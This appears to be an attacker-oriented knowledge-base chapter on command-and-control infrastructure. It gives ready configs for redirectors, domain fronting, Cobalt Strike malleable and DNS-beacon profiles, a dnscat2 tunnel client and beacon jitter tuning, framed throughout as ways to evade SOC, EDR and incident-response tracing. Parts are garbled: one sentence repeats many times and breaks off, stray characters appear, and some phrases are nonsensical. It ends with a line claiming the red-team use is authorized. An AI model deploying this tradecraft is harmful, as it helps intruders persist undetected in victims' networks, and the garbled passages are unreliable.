# c2-infra — malware

# C2 Infrastructure Reference

## 1. Redirector

### 1.1 Konsep

A redirector is a separate hop between the beacon and the C2 server. Functions:
- Protect backend infrastructure (team server IP is never exposed).
- Menghilangkan burn rate domain — redirector murah, team server mahal.
- Domain sink速率: if one redirector is blocked, swap it without reconfiguring the beacon.

**Arsitektur:**
```
Beacon → Redirector (VPS A) → Team Server (VPS B)
         IP publik              IP tidak pernah muncul di log target
```

### 1.2 nginx stream (nginx 1.25.x, module `ngx_stream_proxy_module`)

Layer-4 TCP redirector, does not parse HTTP — works for both HTTP/S beacons and raw sockets.

```nginx
# /etc/nginx/nginx.conf — blok {stream} harus top-level, bukan di dalam {http}
stream {
    server {
        listen 443;
        proxy_pass 10.10.10.10:443;   # IP team server
        proxy_timeout 15s;
        proxy_connect_timeout 5s;
    }
}
```

```bash
apt install nginx=1.25.*
nginx -t && systemctl reload nginx
```

**What is sent:** TCP 443 connection with unchanged payload.
**What appears at the target:** only connection logs to the redirector IP, DNS lookup to the redirector domain.
**Why it works:** the team server IP never appears — if the redirector is incident-responded, the backend remains safe, just burn that VPS and domain alone.
**Why it fails:** redirector ISP/hosting logs still contain the team server egress IP. A SOC that requests cloud provider subpoena logs can still trace the next hop.

**Blokir jejak via iptables bila satu redirector mati (failover cepat):**
```bash
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.10.10.11:443
iptables -t nat -A POSTROUTING -j MASQUERADE
```

### 1.3 HAProxy for inspection (optional)

Productive red teams will use domains for multiple domain fronting (see Chapter 3):

```haproxy
frontend fe_mtls
    bind *:443
    tcp-request inspeksi content
    # SNI-based routing
frontend fe_https
    bind *:443
    tcp-request inspect-delay 5s
    tcp-request content accept if { req.ssl_hello_type 1 }

    use_backend be_c2        if { req.ssl_sni -i legit-cdn.example.com }
    use_backend be_sinkhole  if !{ req.ssl_sni -i legit-cdn.example.com }

backend be_c2
    server teamserver 10.10.10.10:443
backend be_sinkhole
    server sink 192.0.2.1:443
```

**Why it matters:** internet scanners (Shodan, Censys) probing the redirector IP without the correct SNI get a sinkhole, not a C2 banner. The default Cobalt Strike self-signed cert (CN=Major Cobalt Strike, replaced since 4.x but the keyword is still indexed) is the most common masscan fingerprint.

**OPSEC notes redirector:**
- `Listen 443` only. Do not open 80 except for controlled staging that is then closed.
- Change server_tokens: `server_tokens off;` in the http block.
- Do not place the redirector and team server in the same ASN — corporate ONA/traceroute can correlate them.
- Common provider choices: VPS with high abuse tolerance (bulletproof is overkill and attracts attention; pick a middle ground: e.g., a hoster that performs takedowns in 1-3 weeks).

### 1.4 socat

One-liner, no config file, quick to build and tear down:

```bash
# TCP relay sederhana
socat TCP-LISTEN:443,fork,reuseaddr TCP:10.10.10.10:443

# TLS termination di redirector (cert redirector)
socat TCP-LISTEN:443,fork,reuseaddr,reuseport OPENSSL:10.10.10.10:443,verify=0

# DNS forward
socat UDP4-LISTEN:53,fork,reuseaddr UDP4:10.10.10.10:53
```

| Flag | Meaning |
|---|---|
| `fork` | multi-connection |
| `reuseaddr` | restart without TIME_WAIT error |
| `verify=0` | skip cert verification to backend |

**Why it fails:** socat does not load-balance, is not log-friendly, and is prone to connection storms. Use only for quick-strike / short engagement redirectors. socat 1.7.4+ is the last stable; do not build from source without audit.

**What appears:** open port on the VPS but no banner other than the tunneled connection — good for avoiding tool fingerprinting, bad for troubleshooting analysis (no logs).

---

## 2. Domain Fronting

### 2.1 Konsep

The TLS SNI contains the "front" domain (legit CDN), the Host header contains the C2 domain hosted on the same CDN. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevent-list certain traffic patterns. The CDN sees the SNI, and tends to prevention

Cobalt Strike phasing:
1. `host_stage` → domain fronting for the stager
2. Malleable profile `http-get.client` — Host header set via `prepend` and `header Host` for the C2 backend

**What is sent:** TLS ClientHello SNI `[cloudfront domain legit-corp.com]`, HTTP Host header `[gateway].cloudfront.net.
**What appears at the target proxy:** connection to CDN with large traffic, request path looks normal per malleable. Corporate proxies generally whitelist CloudFront/Fastly.
**Why it works:**
- Domain reputation-based egress filters only see the legit domain.
- Sinkhole/EDR that alerts on "beaconing" does not see the C2 IP, only the CDN IP.
- Hard to trace origin (CloudFront does not expose the origin IP via DNS).

**Latest notes (critical OPSEC):**
- CloudFront (AWS) blocks domain fronting by default since 2023 — returns 403 if Host != SNI. Azure Front Door has blocked since the 2017-2020 era (evaluate case by case). Fastly is still permissive.
- Star (subdomain fronting via connection without `url` staging `variable sleep`) still works on certain Azure resources, testable via:
```bash
curl -s -o /dev/null -w '%{http_code}' https://legit-corp.azureedge.net/path -H 'Host: your-c2.azureedge.net'
```
- Switch to domain fronting alternatives: subdomain fronting, domain fronting via a local ISP operator, or beacon via trusted third-party (Discord, Slack webhook).

**People edge case:** some targets channel via **domain fronting via HTTP/2** on CDNs that support h2c upgrade expect — Cobalt Strike does not support natively yet, must be customized via `post-ex` or BOF custom networking.

### 2.2 Product reference

| CDN/Platform | Fronting status | Notes |
|---|---|---|
| CloudFront (AWS) | Blocked (~2023+) | 403 CloudFront if Host/SNI mismatch |
| Azure Front Door | Blocked (2018+) | Blocked since 2018 |
| Fastly | Partial berfungsi | Testaise per domain |
| GCP/Apigee | Case-by-case | Backends per-binding |
| Firebase Hosting | Possible legacy | Depends on region configuration |

Verify live via curl per engagement, do not hardcode assumptions.

---

## 3. Malleable Profile (Cobalt Strike)

### 3.1 Komponen

Cobalt Strike 4.9 malleable C2 profile structure:

```c2profile
# catatan: contoh stub, bukan untuk produksi langsung
http-get {
    set uri "/api/v2/updates";

    client {
        header "Accept" "application/json, text/plain, */*";
        header "Referer" "https://www.example-corp.com/";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
        metadata {
            base64url;
            header "X-Session-Token";
        }
    }

    server {
        header "Content-Type" "application/json";
        output {
            prepend "{\"data\":\"";
            append "\"}";
        }
    }
}

http-post {
    set uri "/api/v2/telemetry";
    client {
        id {
            parameter "cid";
        }
        output {
            print;
        }
    }
}
```

**Komponen utama:**

| Section | Function | OPSEC lever |
|---|---|---|
| `http-get` | polling tasking | custom URI, header, metadata transform |
| `http-post` | upload data (output task, credential, screenshot) | embed id/data in body/form |
| `stage` | setting shellcode stager | `set cleanup false`, obfuscate, rich header |
|Malleable option `sleeptime`, `jitter` | Read Chapter 5 |

**What is sent:** complete HTTP envelopes resembling a real web application.
**What appears in IDS/EDR:** only "normal-looking" traffic — signature-based detection (snort rules for the default CS `/dpixel`) does not fire.
**Why it fails:** malleable only transforms, does not change behavior — an analyst with Zeek + JA3/JA4 + rita/ACID clusters can still spot beacon periodicity. Malleable ≠ invisibility, only avoids signature pattern-matching.

### 3.2 OPSEC malleable notes

- **User-Agent** must match the deployed beacon OS (do not use Chrome/131 UA on a target that turns out to still be IE/Windows 10 per endpoint policy).
- **Do not** use `https` via malleable `http-get` without `set trust_x509_chain` set correctly — the CS self-signed cert historically defaults to the `Major Cobalt Strike` CN, one of the easiest fingerprints for the SOC to YARA. Set the `https-certificate` block before the engagement.

- **SSL cert Block:**
```
https-certificate {
    set C "US";
    set CN "www.example-corp.com";
    set O "Example Corp";
}
```
Gunakan Let's Encrypt/valid cert jika eksekusi public infrastructure.
- Do not use example profiles available on the public internet (e.g., amazon.profile in CS default) — quantifiable detection from Malleable profile analysis (profp: `c2profile` in Atomic Red Team/Threat Hunting repos).

### 3.3 Product references

| Prod/Tool | Lapangan |
|---|---|
| Cobalt Strike 4.9 (2023) | Malleable C2, Beacon HTTP/S/DNS/SMB/TCP named pipe |
| Fortra (CS new license) | Valid for assessment cert/pen-test |

---

## 4. DNS Tunneling

### 4.1 Konsep

C2 channel via recursive DNS query. For egress-restricted DMZ/servers that can only query the internal DNS resolver.

How it works (Cobalt Strike DNS Beacon):
1. Beacon encodes data (output/keystroke/task output) into subdomain labels: `lf5f.a1b2c3.yourdomain.com`
2. Query goes up to the internal recursive resolver → the operator domain's authoritative NS.
3. NS team server decode label, response berisi task/encoded data via TXT/A record (max ~255 byte per field, chunked).

**Kirim:** DNS query standard, port 53 udp/tcp.
**Shows up as:** heavy DNS load to a single odd domain — the "TXT record to a single domain" pattern is the most common hunting tidemark.
**Succeeds when:** the target only permits UDP/53 egress, or it works via long-polling DNS/TXT in a restrictive proxy network.

### 4.2 Cobalt Strike DNS Beacon setup

1. Team server start: `./teamserver <ip> <pass> <profile>` — profile with:
```
dns-beacon {
    set dns_idle "60";
    set dns_sleep "0";   # 0 = polling adaptive
    set maxdns "255";
    set dns_stager_prepend "\x90\x90";
    set beacon "dns";
}
```
2. Set the domain's DNS NS record → team server IP for the listener.
3. Add `listener dns` in the CS GUI.

Important note: use **`beacon dns ` to choose between `mode txt` (more throughput via TXT RR, easier to spot via `strings.txt` heuristic) and mode `mode dns`A (all data in A record hex → more stealthy but slower)**.

### 4.3 dnscat2 as an alternative (not CS)

```bash
# server di VPS
./dnscat -f domain 2>/dev/null
# klien target via binary
dnscat.exe --dns domain=yourdomain.com --secret=<key>
```

**Why it fails:** many enterprise recursive resolvers forward only for official domains (DNSRPZ/Blue Cat Response Policy/SecureDNS Whitelist internal domains), the tunnel will hit 403 `REFUSED`/`NXDOMAIN` for arbitrary external domains. Also windows hosts with a DoH client built into the browser (Chrome/131 defaults to the OS resolver → TCP stream tunneling is not captured correctly if browser DoH diverged).

---

## 5. Beacon Sleep & Jitter

### 5.1 Konsep

**Sleep:** wait time between beacon callbacks. Long = more stealthy (every action waits), short = responsive but noisy.

**Jitter:** random variation of ±X% applied to sleep, so that a metronome interval pattern does not appear.

```
Beacon interval: 60000ms, jitter 20%  → intervals effektif 48000ms–72000ms
interval × (1 ± jitter/100)
```

### 5.2 Commands in CS

```
beacon> sleep 300 20    # sleep 300 detik, jitter 20%
beacon> sleep 60 0
```

Pilihan default rule-of-thumb:

| Engagement phase | sleep | jitter |
|---|---|---|
| initial foothold/persistence | 300–600s | 30–50% |
| lateral movement aktif | 30–60s | 20–30% |
| long-haul/adjunct | 1800–3600s | 50% |

**Why it matters:** RITA/ACID/ThreatPursuit-style periodicity analysis (Dridex-style full-mesh beaconing detection) uses inter-arrival KMeans/circadian scoring on perfect metronome intervals — jitter disrupts the evenness score, making it hard to fall into the "beaconing" cluster.

**Why it fails:**
- Sleep that is too long reduces the window of operation — the task queue grows, and large batch-uploads (from many tasks) become conspicuous traffic spikes.
- Excessive jitter does not eliminate the heartbeat if the Volume stays regular per minimal interval — multi-step detection (persistence analysis) still finds the maximum mode.
- Cobalt Strike `sleep 0` (interactive) during an active C2 session appears as poli-tunnel traffic, not a pulse — different noise pattern, wasted stealth design.

**Real-world tuning:**
- Synchronize with business hours: sleep 10800 (3 hours) default for long-haul, small jitter since manual intervention via `run` task when needed (asynchronous mode with `psh` etc — see `checkin` in CS 4.x asynchronous low-and-slow ops).

---

## 6. Quick Reference Matrix

| Technique | Layer | Stealth | Throughput | Fallback when blocked |
|---|---|---|---|---|
| nginx stream redirector | TCP/L4 | Medium | HTTP normal | rotate IP, socat rebuild |
| socat redirector | TCP/L4 | Medium-low | sama | kill -9 + iptables redirect |
| HAProxy SNI-route | TLS/L7 | High | HTTP normal | change SNIs, add waf-test sink |
| Domain fronting | HTTPS/L7 | High (jika berfungsi) | Full | subdomain fronting, alt CDN |
| Malleable profile | HTTP/L7 | Signature evade | — | rotate profile, test vs IDS |
| DNS tunneling | UDP/53 DNS | Medium-high | Very low (255B/rr) | over TCP/53, DoH, DoT |
| sleep/jitter tuning | Application | high for periodicity detection | low | — |

---

## 7. Operational Pitfalls (Field Failures)

1. **ACME renewal timing:** cert valid via Let's Encrypt (90 days) sometimes already expired mid-engagement because the renewal script does not run on the hardened VPS — EDR client-side shows a self-signed downgrade, the target admin spots it via a cert chain error.

2. **DNS Beacon behind corporate Pi-hole/Internal resolver whitelist:** the tunnel dies silently, no visible error for the operator — the beacon appears alive but no tasking arrives (send a `checkin` test before the operation to confirm the tunnel works).

3. **Cobalt Strike default TLS SNI missing:** the operator forgets to configure `host` in the malleable profile → the beacon sends an empty/nonstandard SNI, NextGenFirewall (e.g., FortiGate) DoH/SNI-inspect flags it immediately.

4. **Redirector IP rotates but domain IP pinning in the average TTD (Time-to-detect) internal DNS resolver cache** of corporate clients: the stager dies, even though the new VPS is running, because the resolver caches the old IP for the TTL (operator who already has a malloc on a foreign legacy-corp environment that caches a 4 hour TTL). Fix: `dnscache` — don't rely only on `dig` from outside — check `ipconfig /displaydns` on the target.

5. **Fortra CS + malleable URI collision with a real corporate application on the same CDN** (duplicate Host header) — the redirector proxy_pass routes wrongly, tasking goes to the corporate backend accessDenied, session lost silently. Always test `checkin` via curl + interactive compare before real deployment.

6. **socat `fork` without `reuseaddr`** and a multi-day engagement → TIME_WAIT sockets exhausted (port exhaustion, kernel warning in dmesg) — don't use socat without a per-dayself monitoring plan.

7. **Malleable UA "Chrome/131" on a Windows 11 24H2 client with company policy-blocked browser auto-update** — the UA mismatches the actual browser version on the host (maybe 120/121), detected via EDR correlating the user's browser process vs the beacon traffic parent PID. Don't hardcode the version, ops must align it with the org's dominant one according to recon results.

8. **Domain fronting assumption without re-test:** public 2021-era malleable profile samples no longer work on CloudFront 2024; the staging operation had already proceeded before the egress test, the beacon sends no `checkin` at all until the operator realizes. Always curl test before staging, and per-tooling egress test in the prep phase.

9. **Jitter too narrow for CS auto-jitter** (e.g., only 10% of sleep 600s) — periodicity detection still succeeds via a median-interval heuristic tolerant of ±20%; use jitter ≥30% and vary the minimum and maximum without refreshing (asynchronous `run` task, not always via `checkin`).

10. **One redirector for all listeners (HTTP staging, DNS beacon SSH pivot, SMB)** — traffic pattern mixing egress paths is conspicuous, plus synchronous tasks: when one redirector is down, all sessions wait. Separate per engagement phase: stager redirector (burnable), long-haul redirector, internal pivot beacon are very different from the initial egress design.

11. **Teamserver with nginx stream on the same VPS** — firewall rule and `proxy_pass` loopback make the egress IP work, but when the VPS burns, it is hard to connect to the team server without an infrastructure rebuild plan. Never colocate redirector and team server in a high burn rate project engagement; separate by ASN and region.

---

## [reasoning trace]

Write internal knowledge base chapter. Include configs, tables, OPSEC notes. Red team authorized context — fine.
